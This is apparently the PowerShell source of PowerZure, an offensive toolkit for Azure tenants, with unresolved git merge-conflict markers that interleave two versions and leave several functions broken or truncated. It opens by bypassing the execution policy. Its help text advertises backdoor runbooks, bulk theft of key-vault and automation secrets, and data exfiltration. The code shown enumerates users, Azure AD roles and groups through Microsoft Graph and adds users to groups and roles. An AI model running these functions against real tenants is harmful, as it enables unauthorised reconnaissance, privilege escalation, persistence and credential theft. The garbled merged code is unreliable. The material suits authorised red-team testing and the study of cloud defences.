Set-ExecutionPolicy Bypass
<<<<<<< Updated upstream
#Version Check
$ErrorActionPreference = "Stop"
$Version = $PSVersionTable.PSVersion.Major
If ($Version -lt 5)
{
    Write-Host "Az requires at least PowerShell 5.1"
}
#Module Check
$Modules = Get-InstalledModule
If ($Modules.Name -contains 'Az')
{
}
Else
{
    Write-Host "Az Module not installed. Installing."
    #This installs the Az module
    Install-Module -Name Az -AllowClobber
    #This installs the Az CLI modules
    Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'
    $directory = pwd
    #After installing the modules, PS needs to be restarted and PowerZure needs to be reimported.
    Start-Process powershell.exe -argument "-noexit -command ipmo '$directory\PowerZure.ps1'"
    #Killing old PS window
    Stop-Process -Id $PID
}
#Login Check
$ErrorActionPreference = "silentlyContinue"
Write-Host @'
                                                                                                                          
8888888b.                                              8888888888P                           
888   Y88b    ________                                       d88P                            
888    888  /\  ___   \                                     d88P                             
888   d88P /  \/   \   \ 888  888  888  .d88b.  888d888   d88P    888  888 888d888  .d88b.  
8888888P"     | # # |    888  888  888 d8P  Y8b 888P"    d88P     888  888 888P"   d8P  Y8b 
888        |  |     |\ | 888  888  888 88888888 888     d88P      888  888 888     88888888 
888            \_ _/  \  Y88b 888 d88P Y8b.     888    d88P       Y88b 888 888     Y8b.     
888         \_________/   "Y8888888P"   "Y8888  888   d8888888888  "Y88888 888      "Y8888                                                                                                                      
                                                                                                                   
'@ 
Try
{  
    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
    if ($User.Length -gt 1)
    {                                                   
    $Id = az ad signed-in-user show --query '[objectId]' -o tsv
    Write-Host "Welcome $User"
    Write-Host ""
    Write-Host "Please set your default subscription with 'Set-Subscription -Id {id}' or 'az account set --subscription {id}' if you have multiple subscriptions."
    Write-Host ""
    Write-Host "Here are your roles and subscriptions:"
    Write-Host ""
	az role assignment list --all --query "[?principalName=='$User'].{Scope:scope,Role:roleDefinitionName}" -o table
    Write-Host ""
    Write-Host "Here are the AD groups you belong to:"
    Write-Host ""
    az ad user get-member-groups --id $Id -o table
    Write-Host ""
    Write-Host "Try PowerZure -h for a list of functions"
    Write-Host ""
    }
    else
    {
    Write-Host "Please login via az login"
    }

}
Catch
{
    Write-Host "Please login via az login"
}
=======
>>>>>>> Stashed changes

function Get-AzureGraphToken
{
    $APSUser = Get-AzContext *>&1 
    $resource = "https://graph.microsoft.com"
    $Token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $resource).AccessToken
    $Headers = @{}
    $Headers.Add("Authorization","Bearer"+ " " + "$($token)")    
    $Headers
}

function PowerZure
{
<# 
.SYNOPSIS
    Displays info about this script.

.PARAMETER 
    -h (Help)

.EXAMPLE
    PowerZure -h
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][switch]$h = $null,
    [Parameter(Mandatory=$false)][switch]$Checks = $null,
    [Parameter(Mandatory=$false)][switch]$Banner = $null,
    [Parameter(Mandatory=$false)][switch]$Welcome = $null)

    If($Checks)
    {
            $ErrorActionPreference = "Stop"
            $Version = $PSVersionTable.PSVersion.Major
            If ($Version -lt 5)
            {
                Write-Host "Az requires at least PowerShell 5.1"
                Exit
            }
            #Module Check
            $Modules = Get-InstalledModule
            if ($Modules.Name -notcontains 'Az.Accounts')
            {
	            Write-host "Install Az PowerShell Module?" -ForegroundColor Yellow 
                $Readhost = Read-Host " ( y / n ) " 
                if ($ReadHost -eq 'y' -or $Readhost -eq 'yes') 
                {
	                Install-Module -Name Az -AllowClobber -Scope CurrentUser
	                $Modules = Get-InstalledModule       
		            if ($Modules.Name -contains 'Az.Accounts')
		            {
			            Write-Host "Successfully installed Az module. Please open a new PowerShell window and re-import PowerZure to continue" -ForegroundColor Yellow
                        Exit
		            }
                }
	
	            if ($ReadHost -eq 'n' -or $Readhost -eq 'no') 
	            {
		            Write-Host "Az PowerShell not installed, PowerZure cannot operate without this module." -ForegroundColor Red
                    Exit
	            }
            }
        } 
    if($h -eq $true)
    {
            Write-Host @"
<<<<<<< Updated upstream

                             PowerZure Version 1.0

                               List of Functions


--Role Needed-- ------------------Mandatory ----------------

Reader          Set-Subscription - Sets the default Subscription to operate in

                ------------------Operational --------------

Contributor     Execute-Command - Will run a command on a specified VM
Contributor     Execute-MSBuild - Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
Contributor     Execute-Program - Executes a supplied program. 
Administrator   Create-Backdoor - Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
                Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
                This requires an account that is part of the 'Administrators' Role (Needed to make a user)
Administrator   Execute-Backdoor - This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
Contributor     Upload-StorageContent - Uploads a supplied file to a storage share.
Contributor     Stop-VM - Stops a VM
Contributor     Start-VM - Starts a VM
Contributor     Restart-VM - Restarts a VM
Contributor     Start-Runbook - Starts a specific Runbook
Owner           Set-Role - Adds a user to a role for a resource or a subscription
Owner           Remove-Role -Removes a user from a role on a resource or subscription
Administrator   Set-Group - Adds a user to an Azure AD group


                ------------------Info Gathering -------------

Reader			Get-Targets - Compares your role to your scope to determine what you have access to and what kind of access it is (Read/write/execute).	
Reader          Get-CurrentUser - Returns the current logged in user name, their role + groups, and any owned objects
Reader          Get-AllUsers - Lists all users in the subscription
Reader          Get-User - Gathers info on a specific user
Reader          Get-AllGroups - Lists all groups + info within Azure AD
Reader          Get-Resources - Lists all resources in the subscription
Reader          Get-Apps - Lists all applications in the subscription
Reader          Get-GroupMembers - Gets all the members of a specific group. Group does NOT mean role.
Reader          Get-AllGroupMembers - Gathers all the group members of all the groups.
Reader          Get-AllRoleMembers - Gets all the members of all roles. Roles does not mean groups.
Reader          Get-RoleMembers -  Gets the members of a role 
Reader          Get-Roles - Gets the roles of a user
Reader          Get-ServicePrincipals - Returns all service principals
Reader          Get-ServicePrincipal - Returns all info on a specified service principal
Reader          Get-Apps - Returns all applications and their Ids
Reader          Get-AppPermissions - Returns the permissions of an app
Reader          Get-WebApps - Gets running webapps
Reader          Get-WebAppDetails - Gets running webapps details

                ---------Secret/Key/Certificate Gathering -----
            
Reader          Get-KeyVaults - Lists the Key Vaults
Contributor     Get-KeyVaultContents - Get the keys, secrets, and certificates from a specific Key Vault
Contributor     Get-AllKeyVaultContents - Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to 
Contributor     Get-AppSecrets - Returns the application passwords or certificate credentials
Contributor     Get-AllAppSecrets - Returns all application passwords or certificate credentials (If accessible)
Contributor     Get-AllSecrets - Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
Contributor     Get-AutomationCredentials - Gets the credentials from any Automation Accounts
=======
			
			  PowerZure Version 1.2

				List of Functions              

------------------Operational --------------

Set-Subscription ------- Sets the default Subscription to operate in
Execute-Command -------- Will run a command on a specified VM
Execute-MSBuild -------- Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
Execute-Program -------- Executes a supplied program. 
Create-Backdoor -------- Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
                         Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
                         This requires an account that is part of the 'Administrators' Role (Needed to make a user)
Execute-Backdoor ------- This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
Execute-CommandRunbook - Will execute a command from a runbook that is ran with a "RunAs" account
Start-Runbook ---------- Starts a specific Runbook
Upload-StorageContent -- Uploads a supplied file to a storage share.
Stop-VM ---------------- Stops a VM
Start-VM --------------- Starts a VM
Restart-VM ------------- Restarts a VM
Create-User   ---------- Creates a user in Azure AD
Set-Password ----------- Sets a user's password in Azure AD
Set-Group -------------- Adds a user to an Azure AD group
Set-Role --------------- Adds a user to a role for a resource or a subscription
Remove-Role ------------ Removes a user from a role on a resource or subscription
Set-AADRoleSP ---------- Sets a user's role in Azure AD while logged in as a Service Principal
Add-SPSecret  ---------- Sets a secret to a Service Principal
Add-ElevatedPrivileges - Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC. 

------------------Info Gathering -------------

Get-Targets ------------ Compares your role to your scope to determine what you have access to and what kind of access it is (Read/write/execute).	
Get-CurrentUser -------- Returns the current logged in user name, their role + groups, and any owned objects
Get-AllUsers ----------- Lists all users in the subscription
Get-User --------------- Gathers info on a specific user
Get-AllGroups ---------- Lists all groups + info within Azure AD
Get-Resources ---------- Lists all resources in the subscription
Get-GroupMembers ------- Gets all the members of a specific group. Group does NOT mean role.
Get-AllGroupMembers ---- Gathers all the group members of all the groups.
Get-AllRoleMembers ----- Gets all the members of all roles. Roles does not mean groups.
Get-RoleMembers -------- Gets the members of a role 
Get-Roles -------------- Gets the roles of a user
Get-ServicePrincipals -- Returns all service principals
Get-ServicePrincipal --- Returns all info on a specified service principal
Get-Apps --------------- Returns all applications and their Ids
Get-AppOwners ---------- Returns all owners of every Application in Azure AD
Get-AppPermissions ----- Returns the permissions of an app
Get-WebApps ------------ Gets running webapps
Get-WebAppDetails ------ Gets running webapps details
Get-RunAsCertificate --- Gets the login credentials for an Automation Accounts "RunAs" service principal
Get-AADRoleMembers ----- Lists the active roles in Azure AD and what users are part of the role
Get-RunAsAccounts ------ Finds any RunAs accounts being used by an Automation Account
>>>>>>> Stashed changes
           
                -----------------Data Exfiltration--------------
            
Reader          Get-StorageAccounts - Gets all storage accounts
Contributor     Get-StorageAccountKeys -  Gets the account keys for a storage account
Reader          Get-StorageContents - Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
Reader          Get-Runbooks - Lists all the Runbooks
Reader          Get-RunbookContent - Reads content of a specific Runbook
Reader          Get-AvailableVMDisks -  Lists the VM disks available. 
Contributor     Get-VMDisk - Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
Reader          Get-VMs - Lists available VMs      


"@

        }
    if($Banner)
    {
Write-Host @' 
                                                                                                                   
8888888b.                                              8888888888P                           
888   Y88b    ________                                       d88P                            
888    888  /\  ___   \                                     d88P                             
888   d88P /  \/   \   \ 888  888  888  .d88b.  888d888   d88P    888  888 888d888  .d88b.  
8888888P"     | # # |    888  888  888 d8P  Y8b 888P"    d88P     888  888 888P"   d8P  Y8b 
888        |  |     |\ | 888  888  888 88888888 888     d88P      888  888 888     88888888 
888            \_ _/  \  Y88b 888 d88P Y8b.     888    d88P       Y88b 888 888     Y8b.     
888         \_________/   "Y8888888P"   "Y8888  888   d8888888888  "Y88888 888      "Y8888    version 2.0                                                                                                                  
 
'@ -ForegroundColor Magenta

            Write-Host 'Confused on what to do next? Check out the documentation: https://powerzure.readthedocs.io/ or type Powerzure -h for a function table.' -ForegroundColor yellow
            Write-Host ""
        }
    if($Welcome)
    {

        $APSUser = Get-AzContext *>&1 
        if(!$APSUser)
        {
	            Write-host "Login to Azure?" -ForegroundColor Yellow 
                $Readhost = Read-Host " ( y / n ) " 
                if ($ReadHost -eq 'y' -or $Readhost -eq 'yes')
                {
                    $a = Connect-AzAccount *>&1 
                    PowerZure -Checks -Welcome 
                }

            }
        if($APSUser)
            {
                $Headers = Get-AzureGraphToken 
		        Write-Host "You are logged into Azure PowerShell" -ForegroundColor Yellow							  
		        $obj = New-Object -TypeName psobject
		        $username = $APSUser.Account
		        $user = Get-AzADUser -UserPrincipalName $Username 
		        $userid=$user.id
		        $rbacroles = Get-AzRoleAssignment -ObjectId $user.id
		        $obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
		        $obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
		        $rolearray = @()
                $scopearray = @()
	            $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
	            $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
	            $aadroles = $data.value
		        ForEach ($aadrole in $aadroles)
		        {
			        $id = $aadrole.roleDefinitionId
			        $uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
			        $roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
			        $rolearray += $roledef.displayName
                    $scopearray += $roledef.resourceScopes
		        }
		        $obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
                $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
		        $uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
		        $body =
@"
{	"securityEnabledOnly": "False"
}
"@
		        $grouparray = @()
		        $groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
		        $groupids = $groupdata.value
		        foreach ($groupid in $groupids)
		        {
			        $groupstuff= Get-AzADGroup -Objectid $groupid
			        $grouparray += $groupstuff.DisplayName
		        }

		        $obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray	
		        $obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
		        $obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope	
                $obj | Add-Member -MemberType NoteProperty -Name SubscriptionName -Value $APSUser.Subscription.Name
                $obj | Add-Member -MemberType NoteProperty -Name SubscriptionId -Value $APSUser.Subscription.Id
		        $obj
            Write-Host ""
            Write-Host "Please set your default subscription with 'Set-Subscription -Id {id} if you have multiple subscriptions." -ForegroundColor Yellow
		
            }
        if(!$Welcome -and !$Checks -and !$h)
            {
	            Write-Host "Please login with Connect-AzAccount" -ForegroundColor Red
            }
            
    }
}

Powerzure -Checks -Banner -Welcome 

function Show-AzureCurrentUser
{
<<<<<<< Updated upstream
<# 
.SYNOPSIS
    List all Azure users in the tenant
.PARAMETER
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureUsers
    Get-AzureUsers -OutFile users.csv
    Get-AzureUsers -OutFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    
=======
    $APSUser = Get-AzContext
    $Headers = Get-AzureGraphToken
    if($APSUser)
     {         						  
		$obj = New-Object -TypeName psobject
		$username = $APSUser.Account
		$user = Get-AzADUser -UserPrincipalName $Username 
		$userid=$user.id
		$rbacroles = Get-AzRoleAssignment -ObjectId $user.id
		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
		$obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
		$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
		$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
		$rolearray = @()
        $scopearray = @()
	    $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
	    $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
	    $aadroles = $data.value
		ForEach ($aadrole in $aadroles)
		{
			$id = $aadrole.roleDefinitionId
			$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
			$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
			$rolearray += $roledef.displayName
            $scopearray += $roledef.resourceScopes
		}
		$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
        $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
		$uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
		$body =
@"
{	"securityEnabledOnly": "False"
}
"@
		$grouparray = @()
		$groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
		$groupids = $groupdata.value
		foreach ($groupid in $groupids)
		{
			$groupstuff= Get-AzADGroup -Objectid $groupid
			$grouparray += $groupstuff.DisplayName
		}
>>>>>>> Stashed changes

		$obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray		
		$obj
		
    }
    else
        {
	Write-Host "Please login with Connect-AzAccount" -ForegroundColor Red
    }  
}

<<<<<<< Updated upstream
function Get-User 
=======
function Set-AzureSubscription
{
<# 
.SYNOPSIS
    Sets default subscription
.PARAMETER
   -Id
.EXAMPLE
   Set-AzureSubscription -Id b049c906-7000-4899-b644-f3eb835f04d0
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true,HelpMessage='Enter a subscription ID. Try Show-AzureCurrentUser to see a list of subscriptions')][String]$Id = $null) 
	Set-AzContext -SubscriptionId $Id
}

function Get-AzureADRoleMember
>>>>>>> Stashed changes
{
<# 
.SYNOPSIS
    Lists the roles in Azure AD and what users are part of the role. 
.PARAMETER
	-All (Lists all roles, even those without a user in them)
    -Role (Specific role)
.EXAMPLE
<<<<<<< Updated upstream
    Get-AzureUser -User Test@domain.com
=======
	Get-AzureADRoleMember -Role 'Company Administrator'
    Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'
	Get-AzureADRoleMember -All
>>>>>>> Stashed changes
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False)][String]$Role = $null,
    [Parameter(Mandatory=$False)][Switch]$All = $null)
    $Headers = Get-AzureGraphToken
	$Uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions'
	$roledata = Invoke-RestMethod -Headers $Headers -Uri $Uri
	$roles = $roledata.value
    
    If($All)
    {
	    ForEach ($AADRole in $Roles)
	    {
		    $Uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter=roleDefinitionId eq ' + "'" + $AADRole.id + "'" + '&$expand=principal'
		    $members = Invoke-RestMethod -Headers $Headers -Uri $Uri
		    If ($members.value.principal.userPrincipalName -and $Roledata)
		    {
			    $obj = New-Object -TypeName psobject
			    $obj | Add-Member -MemberType NoteProperty -Name Role -Value $AADRole.displayName
			    $obj | Add-Member -MemberType NoteProperty -Name RoleID -Value $AADRole.id
			    $obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.value.principal.userPrincipalName
                $obj | Add-Member -MemberType NoteProperty -Name ApplicationMembers -Value $members.value.principal.appDisplayname
			    $obj | fl			    	
		    }
		    elseIf ($Roledata -and $All)
		    {			
			    $obj = New-Object -TypeName psobject
			    $obj | Add-Member -MemberType NoteProperty -Name Role -Value $AADRole.displayName
			    $obj | Add-Member -MemberType NoteProperty -Name RoleID -Value $AADRole.id
			    $obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.value.principal.userPrincipalName
                $obj | Add-Member -MemberType NoteProperty -Name ApplicationMembers -Value $members.value.principal.appDisplayname
			    $obj | fl 			    	
		    }
	    }
    }
    If($Role)
    {
        If($Role.length -eq 36)
        {
            $Uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter=roleDefinitionId eq ' + "'" + $Role + "'" + '&$expand=principal'
	        $result = Invoke-RestMethod -Headers $Headers -Uri $Uri 
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name Role -Value $Role
            $obj | Add-Member -MemberType NoteProperty -Name UserMembers -Value $result.value.principal.userPrincipalName
            $obj | Add-Member -MemberType NoteProperty -Name ApplicationMembers -Value $result.value.principal.appDisplayname
            $obj | fl
        }
        else
        {
            $roles = $roledata.value | Where-Object {$_.DisplayName -eq "$Role"}
            $Uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter=roleDefinitionId eq ' + "'" + $roles.id + "'" + '&$expand=principal'
	        $result = Invoke-RestMethod -Headers $Headers -Uri $Uri 
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name Role -Value $Role
            $obj | Add-Member -MemberType NoteProperty -Name UserMembers -Value $result.value.principal.userPrincipalName
            $obj | Add-Member -MemberType NoteProperty -Name ApplicationMembers -Value $result.value.principal.appDisplayname
            $obj | fl
        }  
    }
<<<<<<< Updated upstream
}

function Get-AllGroups 
{
<# 
.SYNOPSIS
    Gathers all the groups in the tenant
.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureGroups
    Get-AzureGroups -OutFile users.csv
    Get-AzureGroups -outFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    
=======
    If(!$All -and !$Role)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -All" -ForegroundColor Red
        Write-Host "Get-AzureADRoleMember -Role 'Company Administrator'" -ForegroundColor Red
>>>>>>> Stashed changes

    }
}

<<<<<<< Updated upstream
function Get-Apps 
{
<# 
.SYNOPSIS
    Gathers all the application in Azure 
.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AzureApps
    Get-AzureApps -OutFile users.csv
    Get-AzureApps -outFile users.txt
#>

    [CmdletBinding()]
     Param(
        [Parameter(Mandatory=$false)][String]$OutFile = $null)    

    $split = $OutFile.Split(".")
    $type = $split[-1]
    $name = $split[0]
    If($type -eq "csv")
    {
        $i= az ad app list -o json | ConvertFrom-Json
        $i | export-csv $OutFile
    } 
    else
    {
        If($Outfile)
        {
         $i=az ad app list --query='[].{Name:displayName,URL:homepage}' -o yaml | Out-File $OutFile
        }
        else 
        {
         az ad app list --query='[].{Name:displayName,URL:homepage,id:objectId}' -o yaml
        }
	}
    
}

function Get-GroupMembers 
=======
function Get-AzureUser
>>>>>>> Stashed changes
{
<# 
.SYNOPSIS
    Gathers info on a specific user or all users including their groups and roles in Azure & AzureAD

.PARAMETER 
    -Username (User Principal Name)
	-All (Switch)

.EXAMPLE
<<<<<<< Updated upstream
    Get-AzureGroupMembers -Group 'SQL Users'
    Get-AzureGroupMembers -Group 'SQL Users' -OutFile users.csv
    
=======
    Get-AzureUser -Username Test@domain.com
	Get-AzureUser -All
>>>>>>> Stashed changes
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false,HelpMessage='Enter the username with the domain')][String]$Username = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)
    $Headers = Get-AzureGraphToken	
	If($All)
	{
		$users = Get-AzADUser
		ForEach ($user in $users)
		{
			$userid = $user.id
			$rbacroles = Get-AzRoleAssignment -ObjectId $user.id
			$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
			$data = Invoke-RestMethod -Headers $Headers -Uri $uri
			$aadroles = $data.value	
			$obj = New-Object -TypeName psobject			
			$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
			$obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
			$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
			$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
			$rolearray = @()
			ForEach ($aadrole in $aadroles)
			{
				$id = $aadrole.roleDefinitionId
				$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
				$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
				$rolearray += $roledef.displayName
			}
			$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
			$uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
			$body =
@"
{	"securityEnabledOnly": "False"
}
"@
			$grouparray = @()
			$groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
			$groupids = $groupdata.value
			foreach ($groupid in $groupids)
			{
				$groupstuff= Get-AzADGroup -Objectid $groupid
				$grouparray += $groupstuff.DisplayName
			}	
			$obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray
			$obj
			
		}
	}
	
	If($Username)
	{
			  
		$obj = New-Object -TypeName psobject
		$user = Get-AzADUser -UserPrincipalName $Username 
		$userid=$user.id
		$rbacroles = Get-AzRoleAssignment -ObjectId $user.id
		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $user.userPrincipalName
		$obj | Add-Member -MemberType NoteProperty -Name objectId -Value $user.Id
		$obj | Add-Member -MemberType NoteProperty -Name AzureRoles -Value $rbacroles.roleDefinitionName
		$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rbacroles.scope
		$rolearray = @()
        $scopearray = @()
	    $uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter+=+principalId eq' + " " + "'" + $userid + "'"
	    $data = Invoke-RestMethod -Headers $Headers -Uri $uri 
	    $aadroles = $data.value
		ForEach ($aadrole in $aadroles)
		{
			$id = $aadrole.roleDefinitionId
			$uri = "https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$id"
			$roledef = Invoke-RestMethod -Headers $Headers -Uri $uri
			$rolearray += $roledef.displayName
            $scopearray += $roledef.resourceScopes
		}
		$obj | Add-Member -MemberType NoteProperty -Name AADRole -Value $rolearray
        $obj | Add-Member -MemberType NoteProperty -Name AADRoleScope -Value $scopearray
		$uri = "https://graph.microsoft.com/v1.0/Users/$userid/getMemberGroups"
		$body =
@"
{	"securityEnabledOnly": "False"
}
"@
		$grouparray = @()
		$groupdata = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $body -Method Post -Contenttype application/json			
		$groupids = $groupdata.value
		foreach ($groupid in $groupids)
		{
			$groupstuff= Get-AzADGroup -Objectid $groupid
			$grouparray += $groupstuff.DisplayName
		}

		$obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray		
		$obj
    }
    If(!$Username -and !$All)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureUser -Username Test@domain.com" -ForegroundColor Red
        Write-Host "Get-AzureUser -All" -ForegroundColor Red
    }
}

function Get-AzureGroupMember 
{
<# 
.SYNOPSIS
    Gets all the members of a specific group or all members of all groups. Group does NOT mean role.

.PARAMETER 
    -Group (Group name)
	-All (List all group members of all groups)

.EXAMPLE
<<<<<<< Updated upstream
    Get-AllAzureGroupMembers -OutFile members.txt
    
=======
	Get-AzureGroupMember -Group 'Sql Admins'
	Get-AzureGroupMember -All 
>>>>>>> Stashed changes
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false,HelpMessage='Group name')][String]$Group = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)

	If($All)
	{
		Write-Host ""
		$groups=Get-AzADGroup
		ForEach ($g in $groups)
		{
			$members = Get-AzADGroupMember -GroupObjectId $g.id 
			ForEach ($member in $members)
			{ 
			$obj = New-Object -TypeName psobject
			$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $g.displayname
			$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $g.Id
			$obj | Add-Member -MemberType NoteProperty -Name MemberName -Value $member.userPrincipalName
			$obj | Add-Member -MemberType NoteProperty -Name MemberId -Value $member.Id		
			$obj
			}
		} 
	}
	If($group)
	{
		$groupdata = Get-AzADGroup -DisplayName $Group
		$obj = New-Object -TypeName psobject
		$obj | Add-Member -MemberType NoteProperty -Name GroupName -Value $Group
		$obj | Add-Member -MemberType NoteProperty -Name GroupId -Value $groupdata.id
		$members = Get-AzADGroupMember -GroupDisplayName $Group
		$obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.UserPrincipalName
		$obj | Add-Member -MemberType NoteProperty -Name Members -Value $members.Id
		$obj	
	
	}	
	if(!$All -and !$Group)
	{
		Write-Host "Must supply a group name or use -All switch" -ForegroundColor Red
	}
}

function Add-AzureADGroup 
{
<# 
.SYNOPSIS
    Adds a user to an Azure AD Group

.PARAMETER 
    -Username (UPN of the user)
    -Group (AAD Group name)

.EXAMPLE
    Add-AzureADGroup -User john@contoso.com -Group 'SQL Users'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true,HelpMessage='Target Group')][String]$Group = $null,
    [Parameter(Mandatory=$true,HelpMessage='Username to add to group')][String]$Username = $null)    

	Add-AzADGroupMember -MemberUserPrincipalName $Username -TargetGroupDisplayName $Group
}

function Add-AzureADRole
{
<<<<<<< Updated upstream
<# 
.SYNOPSIS
    Gets all the members of all roles. Roles does not mean groups.

.PARAMETERS
    OutFile (.csv is special)
.EXAMPLE
    Get-AllAzureRoleMembers
    Get-AllAzureRoleMembers -OutFile users.csv
    Get-AllAzureRoleMembers -outFile users.txt
#>

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$OutFile = $null)    

    $split = $OutFile.Split(".")
    $type = $split[-1]
    $name = $split[0]
    If($type -eq "csv")
    {
        $i= az role assignment list --all -o json | ConvertFrom-Json
        $i | export-csv $OutFile
        $e=az role assignment list --include-classic-administrators true -o table | Out-File -Append $OutFile
        $e | Out-File -Append $OutFile
    } 
    else
    {
        If($Outfile)
        {
         $i=az role assignment list --all --query '[].{Role:roleDefinitionName,Name:principalName,Type:principalType}' -o table 
         $i | Out-File $OutFile
         $e=az role assignment list --include-classic-administrators true -o table 
         $e | Out-File -Append $OutFile
        }
        else 
        {
        az role assignment list --include-classic-administrators true -o table
        Write-Host ""
        az role assignment list --all --query '[].{Principal:principalName,Role:roleDefinitionName,Type:principalType}' -o table
=======
 <#
.SYNOPSIS
    Adds a role to a user in AzureAD

.PARAMETER
    -Username (Intended User)
    -UserID (Intended User or Service Principal by ID)
    -Role (Intended role)
    -RoleId (Intended role by Id)

.EXAMPLE
